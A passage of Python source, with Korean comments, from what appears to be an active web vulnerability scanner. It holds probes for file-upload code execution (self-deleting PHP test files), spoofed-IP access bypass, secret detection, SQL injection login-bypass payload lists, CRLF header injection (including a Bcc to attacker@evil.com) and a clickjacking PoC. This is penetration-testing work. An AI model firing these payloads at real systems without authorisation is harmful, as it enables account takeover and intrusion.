                        # 검증도 캐시 우회(신선한 요청) — 캐시 HIT 시 삭제 전 200 을 재사용해
                        # 실제로 지워졌는데도 '잔존'으로 오보고하던 문제를 막는다.
                        _vs, _vbody, _ = await _get(session, up_url,
                                                    headers={"User-Agent": _SCANNER_UA})
                        gone = (_vs in (404, 410)) or (not _vbody) or (
                            att["executed"] not in (_vbody or "") and att["raw"] not in (_vbody or ""))
                        cleanup_success = bool(gone)
                        cleanup_detail = (
                            f"자기삭제(@unlink) 후 재확인: HTTP {_vs}, 실행마커 {'소멸' if gone else '잔존'}"
                            if gone else
                            f"자기삭제 시도했으나 재확인 GET 에서 파일 잔존(HTTP {_vs}) — 수동 삭제 필요")
                    except Exception as _e:
                        cleanup_detail = f"삭제 검증 중 오류: {type(_e).__name__} — 수동 삭제 필요"
                else:
                    cleanup_detail = (
                        f"{att['engine']} 는 안전한 자기삭제를 지원하지 않아 업로드 파일이 서버에 남음 "
                        f"— 보고서에 미복구로 명시, 관리자 수동 삭제 필요")

                # ── 실증 스크린샷: '업로드 → 업로드된 파일 URL 접근 → 서버가 42 실행 출력' 촬영 ──
                # 방금 확증에 쓴 파일은 이미 자기삭제됐으므로 스크린샷 전용 파일을 새로 업로드하고,
                # 브라우저로 그 URL 에 접근(=서버가 PHP 소스를 실행해 42 렌더 + @unlink 자기삭제)하는
                # 순간을 담는다. 브라우저 방문 자체가 원상복구(자기삭제)를 겸한다.
                rce_shots: list[str] = []
                if scan_id:
                    try:
                        _ss_stem = "eosup" + secrets.token_hex(3)
                        _ext = att["filename"][att["filename"].rfind("."):] or ".php"
                        _sdata = _ah.FormData()
                        _sdata.add_field(file_field, att["content"], filename=_ss_stem + _ext,
                                         content_type="image/jpeg")
                        for _k, _v in pt["params"].items():
                            if _k != file_field:
                                _sdata.add_field(_k, str(_v))
                        _, _sbody, _shdr = await _post(session, pt["url"], data=_sdata,
                                                       headers={"User-Agent": _SCANNER_UA})
                        _sup = _find_uploaded_url(pt["url"], _ss_stem + _ext, _ss_stem, _shdr, _sbody)
                        if _sup:
                            rce_shots = await _capture_step_shots(scan_id, [
                                (pt["url"],
                                 f"【1단계】 위험 확장자(.php) 파일 업로드 — 인증 영역 업로드 폼\nURL: {pt['url']}",
                                 "#1E3A5F", "left"),
                                (_sup,
                                 "【2단계】 ★ 업로드된 파일 URL 에 직접 접근 (상단이 서버 실행 결과)\n"
                                 f"URL: {_sup}\n"
                                 "→ 서버가 코드를 '실행'해 'It_Was_Executed_By_Eoseureum=42' 출력 = 원격 코드 실행 확증\n"
                                 "(=42 는 6×7 을 서버가 계산한 값 — 정적 서빙이면 원문 \"(6*7)\" 이 보임)",
                                 "#DC2626", "bottom"),
                            ], f"rce_{_ss_stem}")
                    except Exception:
                        rce_shots = []
                return {
                    "url": pt["url"],
                    "uploaded_url": up_url,
                    "evidence_screenshots": rce_shots,
                    "engine": att["engine"],
                    "issue": f"{att['engine']} 스크립트 업로드 후 서버측 코드 실행",
                    "confirmed": True,
                    "code_execution": True,
                    "evidence": (
                        f"파일 업로드 → 원격 코드 실행 실증: {att['filename']} 업로드 후 그 URL 에 접근하니 "
                        f"서버가 코드를 실행해 'It_Was_Executed_By_Eoseureum=42' 를 출력함(=(6×7)을 서버가 "
                        f"'계산'한 값 42 → 정적 서빙이면 원문 \"(6*7)\" 이 보였을 것이나 42 가 보임 = 코드 실행 확증). "
                        f"원문 소스('{att['raw']}')는 미노출. 업로드 URL: {up_url}. "
                        f"업로드 파일은 무해(문구+산술 출력)하며 실행 즉시 자기삭제 시도."
                    ),
                    "cleanup_marker": att["filename"],
                    "cleanup_attempted": cleanup_attempted,
                    "cleanup_success": cleanup_success,
                    "cleanup_detail": cleanup_detail,
                    "affected_endpoints": [pt["url"], up_url],
                }

    # 원상복구 정리 패스: 확증 없이 업로드된 파일(정적서빙 등)도 삭제 시도 후 미복구분 기록.
    # PHP 자기삭제분은 아래 GET 으로 실행되며 사라지고, 정적서빙/자기삭제불가분은 잔존 → 보고.
    _unreverted: list[dict] = []
    for uf in _uploaded_files:
        try:
            if uf["self_cleanup"]:
                await _get(session, uf["up_url"])          # 자기삭제 트리거(실행 시)
            _vs, _vb, _ = await _get(session, uf["up_url"])  # 재확인
            gone = (_vs in (404, 410)) or (not _vb)
            if not gone:
                _unreverted.append({"file": uf["filename"], "url": uf["up_url"],
                                    "reason": ("정적 서빙되어 자기삭제 미발동" if uf["self_cleanup"]
                                               else "엔진 자기삭제 미지원")})
        except Exception:
            _unreverted.append({"file": uf["filename"], "url": uf["up_url"],
                                "reason": "삭제 검증 중 오류"})
    if _unreverted:
        # 미복구 업로드 파일이 있으면 최소한 그 사실을 반환해 보고서가 '수동 삭제 필요'로 표면화
        if unrestricted_form is None:
            unrestricted_form = {
                "url": _uploaded_files[0]["up_url"] if _uploaded_files else base_url,
                "issue": "업로드 테스트 파일 원상복구 실패",
                "confirmed": False,
                "evidence": "무해 테스트 파일 업로드 후 자동 삭제 실패",
            }
        unrestricted_form["cleanup_attempted"] = True
        unrestricted_form["cleanup_success"] = False
        unrestricted_form["unreverted_files"] = _unreverted
        unrestricted_form["cleanup_detail"] = (
            f"업로드한 테스트 파일 {len(_unreverted)}건 자동 삭제 실패 — 관리자 수동 삭제 필요: "
            + ", ".join(u["url"] for u in _unreverted))
    elif unrestricted_form is not None and _uploaded_files:
        unrestricted_form["cleanup_attempted"] = True
        unrestricted_form["cleanup_success"] = True
        unrestricted_form["cleanup_detail"] = "업로드한 테스트 파일 전량 자동 삭제 확인(원상복구 완료)"
    return unrestricted_form


# ── AUTH: IP 우회 / 인증 우회 ─────────────────────────────────────────────────

async def _probe_auth_bypass(session, base_url: str) -> dict | None:
    """
    IP 제한 우회 (X-Forwarded-For 등) 및 관리자 페이지
    기본 자격증명 접근 가능 여부를 확인합니다.
    """
    bypass_headers = [
        {"X-Forwarded-For": "127.0.0.1"},
        {"X-Real-IP": "127.0.0.1"},
        {"X-Client-IP": "127.0.0.1"},
        {"Client-IP": "127.0.0.1"},
        {"CF-Connecting-IP": "127.0.0.1"},
        {"True-Client-IP": "127.0.0.1"},
        {"X-Original-IP": "127.0.0.1"},
    ]
    status_base, _, _ = await _get(session, base_url)
    if status_base == 0:
        return None

    for headers in bypass_headers:
        status, _, _ = await _get(session, base_url, headers=headers)
        if status in (200, 302) and status_base in (403, 401):
            hdr_name = list(headers.keys())[0]
            return {
                "bypass_header": hdr_name,
                "bypass_value": list(headers.values())[0],
                "original_status": status_base,
                "bypassed_status": status,
                "url": base_url,
                "confirmed": True,
                "evidence": (
                    f"IP 우회: {hdr_name}: 127.0.0.1 헤더 추가 시 "
                    f"HTTP {status_base} → {status} 변경 (접근 제어 우회)"
                ),
            }
    return None


# ── JS/HTML 내 민감정보 노출 ──────────────────────────────────────────────────

_SENSITIVE_COMMENT_RE = re.compile(
    r'<!--.*?(password|passwd|secret|api.?key|token|admin|debug|'
    r'credentials|private|auth|config|database|db_pass|hash).*?-->',
    re.IGNORECASE | re.DOTALL,
)

_JS_SECRET_RE = [
    re.compile(r'(api[_\-]?key|apikey|secret|password|token)\s*[:=]\s*["\']([^"\']{8,})["\']', re.IGNORECASE),
    re.compile(r'(AWS_|STRIPE_|TWILIO_|GITHUB_)[A-Z_]+\s*=\s*["\']([^"\']{8,})["\']'),
    re.compile(r'(BEGIN\s+(?:RSA\s+)?PRIVATE\s+KEY)', re.IGNORECASE),
]


# 일반(제네릭) 라벨 — name="value" 패턴이라 UI 문자열/공개키에 오탐 위험. 확정 아닌 POSSIBLE + 값 게이트.
_JS_GENERIC_SECRET_LABELS = {
    "API Key", "Access Token", "Client Secret", "Client ID", "Password", "DB Password",
    "Admin Password", "JWT Secret", "Secret Key", "Encryption Key", "App Secret",
    "Private Key (var)", "PayPal Secret", "AWS Secret Key", "Firebase Key",
    "Google API Key (var)", "Mailchimp API Key", "Mailgun API Key",
}


def _shannon_entropy(s: str) -> float:
    import math
    if not s:
        return 0.0
    counts = {}
    for c in s:
        counts[c] = counts.get(c, 0) + 1
    n = len(s)
    return -sum((c / n) * math.log2(c / n) for c in counts.values())


def _looks_like_real_secret(value: str) -> bool:
    """자연어(공백·한글 등)/저엔트로피 UI 문자열을 배제 — 진짜 시크릿 값만 통과."""
    v = value or ""
    if len(v) < 8:
        return False
    if " " in v or re.search(r'[^\x21-\x7e]', v):    # 공백/비-ASCII(한글 UI 문자열 등)
        return False
    if _shannon_entropy(v) < 3.2:                     # 저엔트로피(반복·사전어)
        return False
    return True


async def _probe_js_secrets(session, base_url: str) -> dict | None:
    """HTML 주석, hidden 필드, JavaScript 파일 내 민감정보 검출 (강화된 패턴)."""
    _, body, _ = await _get(session, base_url)
    if not body:
        return None

    findings = []
    # HTML 주석에서 민감정보 탐색
    for m in _SENSITIVE_COMMENT_RE.finditer(body):
        snippet = m.group(0)[:200].strip()
        findings.append({"type": "html_comment", "snippet": snippet, "confirmed": False})

    # 인라인 JS 및 외부 JS 파일 탐색
    js_sources = []
    for src_m in re.finditer(r'src=["\']([^"\']+\.js(?:\?[^"\']*)?)["\']', body, re.IGNORECASE):
        js_url = _resolve_url(base_url, src_m.group(1))
        if urllib.parse.urlparse(base_url).netloc in js_url:
            js_sources.append(js_url)

    for js_url in js_sources[:15]:
        _, js_body, _ = await _get(session, js_url)
        if not js_body:
            continue
        for pattern, label in _JS_SECRET_PATTERNS:
            for km in pattern.finditer(js_body):
                matched = km.group(0)
                value = km.group(1) if km.lastindex and km.lastindex >= 1 else matched
                # 테스트/예시 값 필터링
                if re.search(r'(example|placeholder|your[_\-]?key|xxx|test|dummy)', value, re.IGNORECASE):
                    continue
                # 일반 라벨: 값 게이트(자연어·저엔트로피 배제) 통과 못 하면 스킵, 통과해도 POSSIBLE.
                # 벤더 특화 라벨(AKIA/AIza/ghp_ 등 구조적): 확정 유지.
                if label in _JS_GENERIC_SECRET_LABELS:
                    if km.lastindex and not _looks_like_real_secret(value):
                        continue
                    _conf = False
                else:
                    _conf = True
                preview = value[:6] + "..." + value[-4:] if len(value) > 12 else value[:10] + "..."
                findings.append({
                    "type": "js_secret",
                    "label": label,
                    "source": js_url,
                    "preview": preview,
                    "confirmed": _conf,
                })
                break

    if not findings:
        return None

    confirmed_findings = [f for f in findings if f.get("confirmed")]
    is_confirmed = bool(confirmed_findings)
    summary_parts = [f"{f.get('label', f['type'])}: {f.get('preview', '')[:40]}" for f in findings[:3]]

    return {
        "url": base_url,
        "findings": findings[:10],
        "confirmed": is_confirmed,
        "evidence": f"JS/HTML 내 민감정보 {len(findings)}건 발견: {'; '.join(summary_parts)}",
    }


# ── PT: Vim 스왑 파일 노출 ───────────────────────────────────────────────────

async def _probe_vim_swp(session, base_url: str) -> dict | None:
    """Vim 스왑 파일(.swp) 노출: 소스코드 복구 가능 여부 확인 (webhacking.kr 기법)."""
    parsed = urllib.parse.urlparse(base_url)
    path = parsed.path.rstrip("/") or "/index.php"
    filename = path.split("/")[-1] or "index.php"
    base_path = "/".join(path.split("/")[:-1]) or ""

    candidates = [
        f"{base_path}/.{filename}.swp",
        f"{base_path}/{filename}~",
        "/.index.php.swp",
        "/index.php.swp",
        "/.index.html.swp",
        "/index.html~",
    ]
    for swp_path in candidates:
        swp_url = f"{parsed.scheme}://{parsed.netloc}{swp_path}"
        status, body, _ = await _get(session, swp_url)
        if status != 200 or not body or len(body) < 20:
            continue
        if body.startswith("b0VIM") or (body[:4] and "\x00" in body[:10]):
            return {
                "url": swp_url,
                "type": "vim_swap_file",
                "confirmed": True,
                "evidence": f"Vim 스왑 파일 노출: {swp_url} — 소스코드 복구 가능 (vim -r로 복원)",
            }
    return None


# ── GI: SQL 인젝션 인증 우회 ──────────────────────────────────────────────────

# 로그인/인증 우회 SQLi payload — 비파괴(읽기 전용 OR/주석/우회만, time-based·stacked·DML 없음).
# 판정은 strict(로그인 폼 이탈/세션/대시보드 등)로 유지하여 오탐을 막는다.
_SQLI_AUTH_BYPASS_PAYLOADS = [
    # 기본 OR 참
    ("' OR '1'='1", "OR 항상 참 조건"),
    ("' OR '1'='1'-- -", "OR 참 + 주석"),
    ("' OR '1'='1'#", "OR 참 + 해시 주석"),
    ("' OR '1'='1'/*", "OR 참 + 블록 주석"),
    ('" OR "1"="1', "쌍따옴표 OR 참"),
    ('" OR "1"="1"-- -', "쌍따옴표 OR + 주석"),
    ("' OR 1=1-- -", "MySQL 주석 OR 우회"),
    ("' OR 1=1#", "MySQL 해시 주석 우회"),
    ("' OR 1=1/*", "블록 주석 OR"),
    ('" OR 1=1-- -', "쌍따옴표 1=1 주석"),
    (") OR ('1'='1", "괄호 닫기 OR 참"),
    ("') OR ('1'='1'-- -", "괄호 + 주석"),
    ("')) OR (('1'='1", "이중 괄호 OR"),
    # admin 직접 우회
    ("admin'-- -", "admin 계정 패스워드 우회"),
    ("admin'#", "admin 해시 주석 우회"),
    ("admin'/*", "admin 블록 주석"),
    ('admin"-- -', "admin 쌍따옴표 주석"),
    ("admin' OR '1'='1", "admin + OR 참"),
    ("administrator'-- -", "administrator 우회"),
    ("admin') -- -", "admin 괄호 주석"),
    # 공백/문자 우회
    ("'\tOR\t'1'='1", "탭 문자 OR 우회"),
    ("'/**/OR/**/'1'='1", "주석 공백 OR 우회"),
    ("'%0aOR%0a'1'='1", "개행 OR 우회"),
    ("'||'1'='1", "OR 파이프라인 우회"),
    ("' OR 'x'='x", "OR x=x"),
    ("' OR 'a'='a'-- -", "OR a=a 주석"),
    # 연산자 우회
    ("' OR 1 IN (1)-- -", "in() 연산자 우회"),
    ("' OR 1 LIKE 1-- -", "LIKE 연산자 우회"),
    ("' OR 1=1 LIMIT 1-- -", "LIMIT 1 우회"),
    ("' OR '1'='1' AND ''='", "혼합 조건 우회"),
    ("1' AND 1=1-- -", "AND 항상 참"),
    ("' OR ''='", "빈 비교 우회"),
    ("' OR 2>1-- -", "부등호 참"),
    ("' OR 'abc'='ab'+'c", "문자열 결합(MSSQL)"),
    ("' OR 'abc'='ab'||'c", "문자열 결합(Oracle/PG)"),
    # 숫자 컨텍스트
    ("1 OR 1=1", "숫자 OR 참(따옴표 없음)"),
    ("0 OR 1=1-- -", "0 OR 참 주석"),
    ("-1 OR 1=1", "음수 OR 참"),
]


# 로그인 필드 인식(login_sqli 와 동일 기준) — uid/passw 등 비표준 명명까지 인식한다.
# login_sqli 의 단일 출처에서 파생(각자 정의 시 발생하던 드리프트 방지)
_AUTH_USER_NAMES = set(login_sqli._USERNAME_FIELDS)
_AUTH_PW_NAMES = set(login_sqli._PASSWORD_FIELDS)


def _auth_is_user_field(name: str) -> bool:
    n = (name or "").lower()
    return n in _AUTH_USER_NAMES or any(k in n for k in ("user", "login", "email", "uid"))


def _auth_is_pw_field(name: str) -> bool:
    n = (name or "").lower()
    return n in _AUTH_PW_NAMES or any(k in n for k in ("pass", "pwd"))


async def _probe_sqli_auth_bypass(session, points: list[dict]) -> dict | None:
    """SQL 인젝션 인증 우회: 로그인 폼에 SQL 페이로드 삽입으로 패스워드 없이 로그인 시도."""
    for pt in _pts_cap(points):
        if pt["method"] != "POST" or pt["source"] not in _FORM_SOURCES:
            continue
        # 필드 인식은 login_sqli 와 동일 기준(uid/passw 등 비표준 명명 대응).
        user_fields = [k for k in pt["params"] if _auth_is_user_field(k)]
        pw_fields = [k for k in pt["params"] if _auth_is_pw_field(k)]
        if not (user_fields and pw_fields):
            continue

        _, body_normal, _ = await _post(session, pt["url"], data=pt["params"])
        normal_len = len(body_normal) if body_normal else 0

        # 계정 잠금 방지: 폼당 시도 수 제한(AUTH_BYPASS_MAX_PER_POINT, 기본 12). 성공 시 조기 종료.
        try:
            _ab_max = max(1, min(38, int(os.getenv("AUTH_BYPASS_MAX_PER_POINT", "12"))))
        except (TypeError, ValueError):
            _ab_max = 12
        # 주입 대상: username 필드(나머지 원본 유지) + password 필드(username 을 흔한 계정명
        # admin 으로 고정 → '알려진 계정 + 패스워드 SQLi' 시나리오 커버).
        targets = [(f, dict(pt["params"])) for f in user_fields]
        for pwf in pw_fields:
            companion = dict(pt["params"])
            for uf in user_fields:
                companion[uf] = "admin"
            targets.append((pwf, companion))

        for param, base_params in targets:
            for payload, desc in _SQLI_AUTH_BYPASS_PAYLOADS[:_ab_max]:
                tp = {**base_params, param: payload}
                status, body, hdrs = await _post(session, pt["url"], data=tp)

                if status not in (200, 302):
                    continue

                # 302 리다이렉트가 로그인 페이지/에러 페이지가 아니면 성공으로 간주
                if status == 302:
                    loc = hdrs.get("Location", "")
                    if loc and not re.search(r"(login|signin|logon|error|fail|denied|invalid|unauthor)", loc, re.IGNORECASE):
                        return {
                            "type": "sql_auth_bypass",
                            "param": param,
                            "payload": payload,
                            "description": desc,
                            "url": pt["url"],
                            "method": "POST",
                            "response_status": status,
                            "redirect_to": loc,
                            "confirmed": True,
                            "evidence": (
                                f"SQL 인젝션 인증 우회: {param}='{payload}' ({desc}) "
                                f"→ HTTP 302 리다이렉트 ({loc}) — 패스워드 없이 로그인 가능"
                            ),
                        }

                # 200 응답이 정상보다 크게 다르고 로그인 성공 키워드가 있으면 성공
                if body and abs(len(body) - normal_len) > 200:
                    if re.search(
                        r"(welcome|logout|dashboard|profile|mypage|계정|환영|로그아웃|my.account)",
                        body, re.IGNORECASE
                    ):
                        return {
                            "type": "sql_auth_bypass",
                            "param": param,
                            "payload": payload,
                            "description": desc,
                            "url": pt["url"],
                            "method": "POST",
                            "response_status": status,
                            "confirmed": True,
                            "evidence": (
                                f"SQL 인젝션 인증 우회: {param}='{payload}' ({desc}) "
                                f"→ 로그인 성공 키워드 응답 확인 — 패스워드 없이 로그인 가능"
                            ),
                        }
    return None


# ── 이메일 헤더 인젝션 ────────────────────────────────────────────────────────

_EMAIL_INJECT_HEADER = "X-Scanner-Mail"
_EMAIL_PARAMS = {"email", "to", "mail", "from", "subject", "recipient", "mailto", "contact"}
_EMAIL_INJECT_PAYLOADS = [
    f"test@test.com\r\n{_EMAIL_INJECT_HEADER}: injected",
    f"test@test.com\n{_EMAIL_INJECT_HEADER}: injected",
    f"test@test.com%0d%0a{_EMAIL_INJECT_HEADER}:injected",
    f"test@test.com%0a{_EMAIL_INJECT_HEADER}:injected",
    f"test@test.com\r\nBcc: attacker@evil.com",
]


async def _probe_email_header_injection(session, points: list[dict]) -> dict | None:
    """이메일 헤더 인젝션: 이메일 파라미터에 CRLF 삽입으로 임의 헤더 추가 시도."""
    inject_re = re.compile(_EMAIL_INJECT_HEADER, re.IGNORECASE)
    for pt in points[:10]:
        for param in list(pt["params"]):
            if param.lower() not in _EMAIL_PARAMS:
                continue
            for payload in _EMAIL_INJECT_PAYLOADS[:3]:
                tp = {**pt["params"], param: payload}
                if pt["method"] == "POST":
                    _, _, hdrs = await _post(session, pt["url"], data=tp)
                else:
                    _, _, hdrs = await _get(session, pt["url"] + "?" + urllib.parse.urlencode(tp))
                if any(inject_re.match(k) for k in hdrs):
                    return {
                        "param": param,
                        "payload": payload,
                        "url": pt["url"],
                        "method": pt["method"],
                        "type": "http_response_splitting",
                        "confirmed": True,
                        "evidence": (
                            f"HTTP 응답 분할/CRLF 헤더 인젝션: {param} 파라미터에 CRLF 삽입 → "
                            f"응답 헤더에 '{_EMAIL_INJECT_HEADER}' 주입 확인. "
                            "(참고: 이메일 헤더 인젝션 자체는 SMTP 아웃바운드에서만 검증 가능 — "
                            "본 점검은 HTTP 응답 분할을 실증)"
                        ),
                    }
    return None


# ── Phase 2: Clickjacking ────────────────────────────────────────────────────

async def _probe_clickjacking(session, base_url: str, scan_id: str = "") -> dict | None:
    """
    Clickjacking: X-Frame-Options/CSP frame-ancestors 부재 + Playwright iframe 실제 로드 확인.
    헤더만 없다고 보고하지 않음 — iframe이 실제로 렌더링되어야 CONFIRMED.
    """
    status, _, hdrs = await _get(session, base_url)
    if status == 0:
        return None

    xfo = hdrs.get("X-Frame-Options", "") or hdrs.get("x-frame-options", "")
    csp = hdrs.get("Content-Security-Policy", "") or hdrs.get("content-security-policy", "")
    has_frame_protection = bool(
        xfo or ("frame-ancestors" in csp.lower())
    )
    if has_frame_protection:
        return None

    # Playwright로 iframe 실제 로드 확인
    if not scan_id:
        return None
    try:
        from playwright.async_api import async_playwright
        async with async_playwright() as pw:
            browser = await pw.chromium.launch(
                headless=True,
                args=["--no-sandbox", "--disable-setuid-sandbox", "--disable-gpu",
                      "--ignore-certificate-errors"],
            )
            ctx = await browser.new_context(
                ignore_https_errors=True, viewport={"width": 1280, "height": 800}
            )
            page = await ctx.new_page()
            poc_html = f"""<!DOCTYPE html>
<html><head><meta charset="utf-8">
<style>
body{{margin:0;background:#1a1a2e;font-family:monospace;}}
.banner{{background:#dc2626;color:#fff;padding:12px 20px;font-size:13px;font-weight:bold;text-align:center;}}
.container{{position:relative;width:100%;height:500px;margin-top:8px;}}
iframe{{width:100%;height:100%;border:3px solid #dc2626;}}
.overlay{{position:absolute;top:0;left:0;right:0;background:rgba(220,38,38,0.85);
          color:#fff;padding:10px;font-size:12px;font-weight:bold;z-index:10;}}
</style></head><body>
<div class="banner">★ Clickjacking 취약점 PoC — {base_url[:80]}</div>
<div class="container">
  <div class="overlay">공격자 페이지: 피해자는 아래 콘텐츠를 직접 클릭하는 줄 알지만 실제로는 위 iframe을 클릭함</div>
  <iframe id="victim" src="{base_url}" sandbox="allow-scripts allow-same-origin allow-forms"></iframe>
</div>
</body></html>"""
            try:
                await page.set_content(poc_html, wait_until="domcontentloaded", timeout=10000)
                await page.wait_for_timeout(2000)
                # iframe이 실제로 로드되었는지 확인
                iframe_el = await page.query_selector("iframe")
                loaded = False
                if iframe_el:
                    frame = await iframe_el.content_frame()
                    if frame:
                        title = await frame.title()
                        loaded = True  # title을 읽을 수 있으면 로드됨

                if loaded:
                    fname = f"{scan_id}_clickjack_poc.png"
                    await page.screenshot(path=str(_SCREENSHOTS_DIR / fname), full_page=False)
                    return {
                        "url": base_url,
                        "confirmed": True,
                        "xfo_header": xfo or "(없음)",
                        "csp_fa": "frame-ancestors" in csp.lower(),
                        "evidence_screenshots": [fname],
                        "evidence": (
                            f"Clickjacking 실증: X-Frame-Options 헤더 없음, "
                            f"CSP frame-ancestors 없음. "
                            f"Playwright iframe 실제 로드 확인 (스크린샷 {fname})"
                        ),
                    }
            except Exception:
                pass
            finally:
                try:
                    await ctx.close()
                    await browser.close()
                except Exception:
                    pass
    except ImportError:
        pass
    except Exception:
        pass
    return None


# ── Phase 2: Swagger / OpenAPI 노출 ─────────────────────────────────────────

_SWAGGER_PATHS = [
    "/swagger-ui.html", "/swagger-ui/", "/swagger/ui/",
    "/swagger/", "/swagger/index.html",
    "/api-docs", "/v2/api-docs", "/v3/api-docs",
    "/openapi.json", "/openapi.yaml",
    "/swagger.json", "/swagger.yaml",
    # 비표준 스펙 파일명(실측: testfire 는 /swagger/properties.json)
    "/swagger/swagger.json", "/swagger/openapi.json", "/swagger/properties.json",
    "/swagger/v1/swagger.json", "/api-docs/swagger.json",
    "/api/swagger-ui.html", "/api/v1/swagger-ui.html",
    "/api/swagger.json", "/api/openapi.json",
]

_SWAGGER_CONTENT_RE = re.compile(
    r'(swagger|openapi|"paths"\s*:|"info"\s*:|SwaggerUI|swagger-ui\.js)',
    re.IGNORECASE,
)

# 실제 스펙 JSON/YAML 본문인지(=엔드포인트 열거 가능) 판별
_SPEC_JSON_HINT = re.compile(r'"(?:swagger|openapi)"\s*:|"paths"\s*:', re.IGNORECASE)
# swagger-ui HTML/JS 에서 실제 스펙 URL 추출(url:, configUrl:, urls:[{url:...}])
_SWAGGER_SPEC_URL_RE = re.compile(
    r'''(?:url|configUrl)\s*[:=]\s*["']([^"'\s{}]+\.(?:json|ya?ml)[^"'\s]*)["']''',
    re.IGNORECASE,
)


def _extract_spec_urls(html: str, page_url: str) -> list[str]:
    """swagger-ui 페이지/JS 에서 실제 스펙 URL 후보를 추출(상대경로는 page_url 기준으로 해석).
    비표준 파일명(properties.json 등)도 같은 디렉터리 기준 후보로 추가."""
    out, seen = [], set()
    for m in _SWAGGER_SPEC_URL_RE.finditer(html[:20000]):
        cand = m.group(1)
        if not cand:
            continue
        full = urllib.parse.urljoin(page_url, cand)
        if full not in seen:
            seen.add(full)
            out.append(full)
    for name in ("properties.json", "swagger.json", "openapi.json", "api-docs.json", "spec.json"):
        full = urllib.parse.urljoin(page_url, name)
        if full not in seen:
            seen.add(full)
            out.append(full)
    return out

_ADMIN_API_RE = re.compile(r'/(?:admin|manage|management|internal|private|system|debug)', re.IGNORECASE)
_AUTH_API_RE = re.compile(r'/(?:auth|login|logout|token|oauth|signup|register|password)', re.IGNORECASE)
_PAYMENT_API_RE = re.compile(r'/(?:payment|pay|order|billing|charge|transaction|invoice)', re.IGNORECASE)
_USER_API_RE = re.compile(r'/(?:user|users|account|accounts|member|members|profile)', re.IGNORECASE)


def _parse_openapi_spec(body: str, spec_url: str) -> dict:
    """OpenAPI JSON 스펙을 파싱하여 API 통계와 분류 정보를 반환합니다."""
    summary = {
        "total_endpoints": 0,
        "by_method": {"GET": 0, "POST": 0, "PUT": 0, "DELETE": 0, "PATCH": 0},
        "admin_endpoints": [],
        "auth_endpoints": [],
        "payment_endpoints": [],
        "user_endpoints": [],
        "has_security_definitions": False,
        "api_title": "",
        "api_version": "",
    }
    try:
        import json as _j
        spec = _j.loads(body)
    except Exception:
        # YAML 파싱 시도
        try:
            import yaml as _y
            spec = _y.safe_load(body)
        except Exception:
            # 정규식 fallback
            path_matches = re.findall(r'"(/[^"]+)"\s*:\s*\{', body[:20000])
            summary["total_endpoints"] = len(path_matches)
            for p in path_matches:
                if _ADMIN_API_RE.search(p):
                    summary["admin_endpoints"].append(p)
                elif _AUTH_API_RE.search(p):
                    summary["auth_endpoints"].append(p)
            return summary

    if not isinstance(spec, dict):
        return summary

    # 메타 정보
    info = spec.get("info", {})
    summary["api_title"] = str(info.get("title", ""))[:60]
    summary["api_version"] = str(info.get("version", ""))[:20]
    summary["has_security_definitions"] = bool(
        spec.get("securityDefinitions") or spec.get("components", {}).get("securitySchemes")
    )

    # 경로 순회
    paths = spec.get("paths", {})
    if not isinstance(paths, dict):
        return summary

    http_methods = {"get", "post", "put", "delete", "patch", "head", "options"}
    for path_str, path_item in paths.items():
        if not isinstance(path_item, dict):
            continue
        for method, _ in path_item.items():
            if method.lower() not in http_methods:
                continue
            summary["total_endpoints"] += 1
            m_upper = method.upper()
            if m_upper in summary["by_method"]:
                summary["by_method"][m_upper] += 1
            if _ADMIN_API_RE.search(path_str):
                summary["admin_endpoints"].append(f"{m_upper} {path_str}")
            elif _AUTH_API_RE.search(path_str):
                summary["auth_endpoints"].append(f"{m_upper} {path_str}")
            elif _PAYMENT_API_RE.search(path_str):
                summary["payment_endpoints"].append(f"{m_upper} {path_str}")
            elif _USER_API_RE.search(path_str):
                summary["user_endpoints"].append(f"{m_upper} {path_str}")

    # 목록 최대 10개로 제한
    for key in ("admin_endpoints", "auth_endpoints", "payment_endpoints", "user_endpoints"):
        summary[key] = summary[key][:10]

    return summary


# ── ① OpenAPI/Swagger 스펙 흡수 → 자동 주입점 생성 ─────────────────────────────
def _spec_base_url(spec: dict, spec_url: str) -> str:
    """스펙의 servers(3.x)/basePath+host(2.0) 또는 spec_url 오리진에서 API 베이스 URL 도출."""
    p = urllib.parse.urlparse(spec_url)
    origin = f"{p.scheme}://{p.netloc}"
    # OpenAPI 3.x servers
    servers = spec.get("servers")
    if isinstance(servers, list) and servers and isinstance(servers[0], dict):
        u = str(servers[0].get("url", "")).strip()
        if u.startswith("http"):
            return u.rstrip("/")
        if u.startswith("/"):
            return origin + u.rstrip("/")
    # Swagger 2.0 basePath
    bp = str(spec.get("basePath", "") or "").strip()
    return (origin + bp.rstrip("/")) if bp.startswith("/") else origin


def _sample_value(schema: dict | None, name: str = "") -> str:
    """스키마/파라미터명 기반 무해 테스트값(주입 마커는 각 프로브가 붙이므로 여기선 기본값)."""
    t = (schema or {}).get("type") if isinstance(schema, dict) else None
    nl = name.lower()
    if t in ("integer", "number") or nl in ("id", "uid", "no", "num", "page", "count", "limit", "offset"):
        return "1"
    if t == "boolean":
        return "true"
    if "email" in nl:
        return "test@test.com"
    return "test"


def openapi_spec_to_injection_points(body: str, spec_url: str, cap: int = 120) -> list[dict]:
    """OpenAPI 3.x / Swagger 2.0 스펙을 파싱해 능동점검용 주입점 목록으로 변환한다.

    각 (path, method)에 대해 query/path 파라미터 + (JSON) requestBody 상위 필드를 추출해
    표준 주입점 포맷 {method,url,params,source,csrf_fields} 으로 만든다. 주입 페이로드는 각
    인젝션 프로브가 params 값에 부여하므로 여기선 무해 기본값만 채운다.
    """
    try:
        import json as _j
        spec = _j.loads(body)
    except Exception:
        try:
            import yaml as _y
            spec = _y.safe_load(body)
        except Exception:
            return []
    if not isinstance(spec, dict):
        return []
    base = _spec_base_url(spec, spec_url)
    paths = spec.get("paths")
    if not isinstance(paths, dict):
        return []
    http_methods = {"get", "post", "put", "delete", "patch"}
    points: list[dict] = []
    seen: set = set()
    for path_str, path_item in paths.items():
        if not isinstance(path_item, dict) or not str(path_str).startswith("/"):
            continue
        # path 레벨 공통 파라미터
        common_params = path_item.get("parameters") if isinstance(path_item.get("parameters"), list) else []
        for method, op in path_item.items():
            if method.lower() not in http_methods or not isinstance(op, dict):
                continue
            m = method.upper()
            query_params: dict = {}
            path_fill: dict = {}
            # parameters (query/path)
            for prm in list(common_params) + (op.get("parameters") or []):
                if not isinstance(prm, dict):
                    continue
                loc = prm.get("in"); nm = prm.get("name")
                if not nm:
                    continue
                val = _sample_value(prm.get("schema") or prm, str(nm))
                if loc == "query":
                    query_params[str(nm)] = val
                elif loc == "path":
                    path_fill[str(nm)] = val
